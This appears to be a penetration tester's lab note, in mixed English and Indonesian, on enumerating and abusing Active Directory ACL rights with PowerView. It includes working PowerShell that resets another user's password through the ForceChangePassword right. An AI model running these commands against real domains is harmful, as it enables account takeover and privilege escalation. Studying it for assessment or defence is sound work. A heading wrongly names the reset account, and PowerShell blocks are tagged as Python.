# ACL - Enumeration &  Abuse

## Why are ACEs Important?

ðŸ’¡ Attackers utilize ACE entries to either further access or establish persistence. 
These can be great for us as penetration testers as many organizations are unaware of the ACEs applied to each object or the  impact that these can have if applied incorrectly. 
They cannot be  detected by vulnerability scanning tools, and often go unchecked for  many years, especially in large and complex environments. During an assessment where the client 
has taken care of all of the "low hanging fruit" AD flaws/misconfigurations, ACL abuse can be a great way for us to move laterally/vertically and even achieve full domain compromise. 
Some example Active Directory object security permissions are as follows. These can be enumerated (and visualized) using a tool such as BloodHound, and are all abusable with PowerView, among other tools:



```python
	
- ForceChangePassword:  abused with Set-DomainUserPassword
- Add Members:  abused with Add-DomainGroupMember
- GenericAll:  abused with Set-DomainUserPassword or Add-DomainGroupMember
- GenericWrite:  abused with Set-DomainObject
- WriteOwner:  abused with Set-DomainObjectOwner
- WriteDACL:  abused with Add-DomainObjectACL
- AllExtendedRights:  abused with Set-DomainUserPassword or Add-DomainGroupMember
- Addself:  abused with Add-DomainGroupMember
```

### ACL Enumeration With Powerview
In this section we use scenarion that:
1. we have compromise user with username wley
2. User wley has Force Change Password Object to User damundsen
3. Login as damundsen, Enumerate this user has Generic Write rights to Help Desk Level 1 Groups
4. Adding ourself (damundsen) as member of HELP DESK IT LEVEL 1
   
### Enumerate ForceChangePassword Right

```python
Import-Module .\PowerView.ps1
$sid = Convert-NameToSid wley
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}

##output Yang Diharapkan
ObjectDN               : CN=Dana Amundsen,OU=DevOps,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
```

*Enumerate All Users* 
```python
Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}

```

## Abusing Force Change Password
**changing wley password without knowing his old password**

First, Store Password user kita ke powershell credential
   
```python
   PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD Kita >' -AsPlainText -Force
   PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

Then, Kemudian create password dari user target (eg disini user damundsen yang bisa kita ganti)
```python
PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```
